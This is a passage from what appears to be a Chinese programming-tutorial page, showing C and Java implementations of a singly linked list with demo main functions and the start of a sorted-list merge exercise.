注：只是清空操作，表对象仍然存在，只是没数据而已。所以表对象指针不会发生变化，没必要用二级指针，一级指针就能搞定。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clearList</span><span class="params">(LIST *pList)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pNODE p,q;</span><br><span class="line">    <span class="comment">// 参数校验</span></span><br><span class="line">    <span class="keyword">if</span>(pList==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 做好循环控制并针对每个数据结点，释放结点空间。建议用while循环，想想循环结束条件是什么？</span></span><br><span class="line">    p=pList-&gt;pHeadOfData-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q=p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        p=q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// pHeadOfData指针复位</span></span><br><span class="line">    pList-&gt;pHeadOfData-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 调整表长，恢复为0 ，此步骤千万别忘了！</span></span><br><span class="line">    pList-&gt;Count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *  函数名字：destroyList</span></span><br><span class="line"><span class="comment"> *  函数功能：销毁一个单向链表</span></span><br><span class="line"><span class="comment"> *  函数参数：ppList――是一个2级指针，因为要销毁空间，所以需要在函数内改变实参的值（往外传一个NULL），所以要用2级指针</span></span><br><span class="line"><span class="comment"> *  函数返回：int型，0表示操作正常结束</span></span><br><span class="line"><span class="comment"> *  备    注：</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">destroyList</span><span class="params">(LIST **ppList)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pNODE p,q;</span><br><span class="line">    <span class="comment">// 参数校验</span></span><br><span class="line">    <span class="keyword">if</span>(ppList==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 清空数据并销毁数据</span></span><br><span class="line">    p=(*ppList)-&gt;pHeadOfData-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        q=p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        p=q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 释放表对象所占空间</span></span><br><span class="line">    <span class="built_in">free</span>((*ppList)-&gt;pHeadOfData);</span><br><span class="line"><span class="comment">//  free((*ppList)-&gt;pTailOfData);</span></span><br><span class="line">    <span class="comment">// 表对象指针复位</span></span><br><span class="line">    *ppList=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************</span></span><br><span class="line"><span class="comment"> *  函数名字：MergeList</span></span><br><span class="line"><span class="comment"> *  函数功能：将2个单链表进行无序合并，合并后不改变原有的2个表的数据。</span></span><br><span class="line"><span class="comment"> *  函数参数：pList1――指向某单链表对象1的一级指针，要求非空</span></span><br><span class="line"><span class="comment"> *            pList2――指向某单链表对象2的一级指针，要求非空</span></span><br><span class="line"><span class="comment"> *  函数返回：int型，0表示操作正常结束</span></span><br><span class="line"><span class="comment"> *  备    注：</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//    int MergeList(LIST *pList1,   LIST *pList2)</span></span><br><span class="line"><span class="comment">//    int MergeList(LIST **ppList1, LIST *pList2)</span></span><br><span class="line"><span class="comment">// LIST * MergeList(LIST *pList1,   LIST *pList2)</span></span><br><span class="line"><span class="comment">//    ......</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret, pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LIST</span> *<span class="title">pList1</span>;</span></span><br><span class="line"><span class="comment">//  struct LIST *pList2;</span></span><br><span class="line">    Elemtype value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建链表1，并填入数据</span></span><br><span class="line">    ret= createList(&amp;pList1);     <span class="comment">// 一定要看清楚此处的用法哦！pList1是一级指针，所以&amp;pList1就是二级指针了（一级指针的地址，有些书上称之为二级指针类型了）！</span></span><br><span class="line">    value.ID= <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">memset</span>(value.name, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(value.name,<span class="string">"汤唯"</span>, <span class="number">4</span>);</span><br><span class="line">    AddToTail(pList1, value);</span><br><span class="line"></span><br><span class="line">    value.ID= <span class="number">20</span>;</span><br><span class="line">    <span class="built_in">memset</span>(value.name, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(value.name,<span class="string">"林志玲"</span>, <span class="number">6</span>);</span><br><span class="line">    AddToTail(pList1, value);</span><br><span class="line"></span><br><span class="line">    value.ID= <span class="number">30</span>;</span><br><span class="line">    <span class="built_in">memset</span>(value.name, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(value.name,<span class="string">"关之琳"</span>, <span class="number">6</span>);</span><br><span class="line">    AddToTail(pList1, value);</span><br><span class="line"></span><br><span class="line">    value.ID= <span class="number">40</span>;</span><br><span class="line">    <span class="built_in">memset</span>(value.name, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(value.name,<span class="string">"迪丽热巴"</span>, <span class="number">8</span>);</span><br><span class="line">    AddToTail(pList1, value);</span><br><span class="line"></span><br><span class="line">    output(pList1);  <span class="comment">//输出显示单链表的所有数据</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"=========下面演示删除=====================\n"</span>);</span><br><span class="line">    pos= <span class="number">8</span>;</span><br><span class="line">    ret= DelByPos(pList1, pos, &amp;value); <span class="comment">//删除第8个。但是不存在第8个结点，删除失败，返回-1，放弃删除（你也可以编程实现让它在这种情况下（pos&gt;count时）去删除最后一个结点来作为对用户的回应）</span></span><br><span class="line">    <span class="keyword">if</span> (ret== <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"我删除了%s这个结点\n"</span>, value.name);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"我没法删除第%d个结点\n"</span>, pos);</span><br><span class="line">    output(pList1);  <span class="comment">//输出显示单链表的所有数据</span></span><br><span class="line">    clearList(pList1);</span><br><span class="line">    destroyList(&amp;pList1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"okkk"</span>);</span><br><span class="line"><span class="comment">//  printf("=========下面用过时的创建函数演示一下========\n");</span></span><br><span class="line"><span class="comment">//  ret= createList2(&amp;pList2); //用老方法来创建，在创建的同时就在插入元素，模块的划分有点混乱</span></span><br><span class="line"><span class="comment">//  output(pHead2);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//同学们可以在下面针对上面写的所有函数自行添加测试代码去使用一下！</span></span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Java版本：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Java没有指针，用对象引用的方法</span></span><br><span class="line"><span class="comment">//单链表单个结点类型定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">node</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> data;</span><br><span class="line">    <span class="keyword">public</span> node next;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">node</span><span class="params">(<span class="keyword">int</span> data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">        <span class="keyword">this</span>.next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">node</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.data = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Linklist</span></span>&#123;</span><br><span class="line">    <span class="comment">//错误代码</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> PARAM_ERROR = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NOTFIND = -<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> OREADY = -<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> node HeadofData;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//创建一个带头结点的链表</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Linklist</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        HeadofData=<span class="keyword">new</span> node(<span class="number">0</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取单链表的长度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在表尾插入一个结点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pin 插入的结点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">AddtoTail</span><span class="params">(node pin)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> InsertbyPos(pin,count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * InsertbyPos:根据位置插入结点，如果位置大于链表长度，会插在链表尾</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pin 插入的结点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos 插入的位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">InsertbyPos</span><span class="params">(node pin,<span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//参数校验</span></span><br><span class="line">        <span class="keyword">if</span>(HeadofData == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//极端情况，调整参数</span></span><br><span class="line">        <span class="keyword">if</span>(pos &gt; count) &#123;</span><br><span class="line">            pos = count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pos &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            pos = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        node p = HeadofData;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; pos) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pin.next = p.next;</span><br><span class="line">        p.next = pin;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 按位置查找结点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos 结点位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回结点上的数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">SearchbyPos</span><span class="params">(<span class="keyword">int</span> pos,node elem)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//参数校验</span></span><br><span class="line">        <span class="keyword">if</span>(HeadofData == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        node p = HeadofData.next;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; pos &amp;&amp; p.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            p = p.next;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i == pos) &#123;</span><br><span class="line">            elem.data = p.data;</span><br><span class="line">            elem.next = p.next;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> NOTFIND;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//表头添加一个结点</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">AddtoHead</span><span class="params">(node pin)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> InsertbyPos(pin,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//输出单链表中所有的数据</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Output</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"表中结点元素："</span>);</span><br><span class="line">        node p = HeadofData;</span><br><span class="line">        p = HeadofData.next;</span><br><span class="line">        <span class="keyword">while</span>(p != <span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.print(p.data+<span class="string">" "</span>);</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 按位置删除</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos 结点位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> delelem 删除的结点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">DelbyPos</span><span class="params">(<span class="keyword">int</span> pos,node delelem)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//参数校验</span></span><br><span class="line">        node previous = HeadofData;</span><br><span class="line">        node current = HeadofData;</span><br><span class="line">        <span class="keyword">if</span>(HeadofData == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> flag = SearchbyPos(pos, delelem);</span><br><span class="line">        <span class="keyword">if</span>(flag == NOTFIND) &#123;</span><br><span class="line">            <span class="keyword">return</span> NOTFIND;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//删除结点</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; pos) &#123;</span><br><span class="line">            previous = current;</span><br><span class="line">            current = current.next;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        previous.next = current.next;</span><br><span class="line">        count--;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 链表排序</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> moudle 1为从小到大，2为从大到小</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">order</span><span class="params">(<span class="keyword">int</span> moudle)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//参数校验</span></span><br><span class="line">        <span class="keyword">if</span>(HeadofData == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> PARAM_ERROR;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> temp;</span><br><span class="line">        node pNode = HeadofData;</span><br><span class="line">        <span class="keyword">if</span>(moudle == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++) &#123;</span><br><span class="line">                pNode = HeadofData.next;</span><br><span class="line">                <span class="keyword">while</span>(pNode.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(pNode.data &gt; pNode.next.data) &#123;</span><br><span class="line">                        temp = pNode.data;</span><br><span class="line">                        pNode.data = pNode.next.data;</span><br><span class="line">                        pNode.next.data =temp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    pNode = pNode.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; count;i++) &#123;</span><br><span class="line">                pNode = HeadofData.next;</span><br><span class="line">                <span class="keyword">while</span>(pNode.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(pNode.data &gt; pNode.next.data) &#123;</span><br><span class="line">                        temp = pNode.data;</span><br><span class="line">                        pNode.data = pNode.next.data;</span><br><span class="line">                        pNode.next.data =temp;</span><br><span class="line">                    &#125;</span><br><span class="line">                    pNode = pNode.next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取前驱结点</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pos</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> node <span class="title">GetPre</span><span class="params">(<span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line">        node elem = <span class="keyword">new</span> node();</span><br><span class="line">        SearchbyPos(pos-<span class="number">1</span>, elem);</span><br><span class="line">        <span class="keyword">return</span> elem;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//清空链表</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">clearlist</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(HeadofData == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> OREADY;</span><br><span class="line">        &#125;</span><br><span class="line">        HeadofData.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Linklist plist1 = <span class="keyword">new</span> Linklist();</span><br><span class="line">        <span class="keyword">if</span>(plist1.HeadofData == <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"创建单链表失败"</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        node p1 = <span class="keyword">new</span> node(<span class="number">6</span>);</span><br><span class="line">        plist1.AddtoTail(p1);</span><br><span class="line">        node p2 = <span class="keyword">new</span> node(<span class="number">8</span>);</span><br><span class="line">        plist1.AddtoTail(p2);</span><br><span class="line">        node p3 = <span class="keyword">new</span> node(<span class="number">10</span>);</span><br><span class="line">        plist1.AddtoTail(p3);</span><br><span class="line">        node p4 = <span class="keyword">new</span> node(<span class="number">3</span>);</span><br><span class="line">        plist1.AddtoTail(p4);</span><br><span class="line">        node p5 = <span class="keyword">new</span> node(<span class="number">13</span>);</span><br><span class="line">        plist1.AddtoTail(p5);</span><br><span class="line">        System.out.println(<span class="string">"单链表创建成功，表的长度为："</span>+plist1.length());</span><br><span class="line">        plist1.Output();</span><br><span class="line">        node elem1 = <span class="keyword">new</span> node(); <span class="comment">//存储查找到的结点</span></span><br><span class="line">        plist1.SearchbyPos(<span class="number">3</span>, elem1);</span><br><span class="line">        System.out.println(<span class="string">"第三个结点元素是："</span>+elem1.data);</span><br><span class="line">        node elem2 = <span class="keyword">new</span> node();</span><br><span class="line">        plist1.DelbyPos(<span class="number">3</span>, elem2);</span><br><span class="line">        System.out.println(<span class="string">"删除第三个结点上，结点元素为："</span>+elem2.data);</span><br><span class="line">        plist1.Output();</span><br><span class="line">        System.out.println(<span class="string">"在三号位置后插入结点，元素为29"</span>);</span><br><span class="line">        node p6 = <span class="keyword">new</span> node(<span class="number">29</span>);</span><br><span class="line">        plist1.InsertbyPos(p6, <span class="number">3</span>);</span><br><span class="line">        plist1.Output();</span><br><span class="line">        System.out.println(<span class="string">"在表头插入结点，元素为3"</span>);</span><br><span class="line">        node p7 = <span class="keyword">new</span> node(<span class="number">3</span>);</span><br><span class="line">        plist1.AddtoHead(p7);</span><br><span class="line">        plist1.Output();</span><br><span class="line">        plist1.order(<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">"将表中元素排序后"</span>);</span><br><span class="line">        plist1.Output();</span><br><span class="line">        node elem3 = plist1.GetPre(<span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">"位置三的前驱为："</span>+elem3.data);</span><br><span class="line">        plist1.clearlist();</span><br><span class="line">        plist1.Output();</span><br><span class="line">        System.out.println(<span class="string">"链表清空成功"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="42-链表合并排序"><a href="#42-链表合并排序" class="headerlink" title="42 链表合并排序"></a>42 链表合并排序</h2><p><strong>题目描述</strong></p><p>&emsp;&emsp;已有a、b两个链表，每个链表中的节点包括学号、成绩，且a、b两个链表中的节点均按照学号升序排列。要求把两个链表合并，按照学号升序排列并输出。 </p><p><strong>样例输入</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Please</span> <span class="string">input</span> <span class="string">n</span> <span class="string">m:[1-100]</span></span><br><span class="line"><span 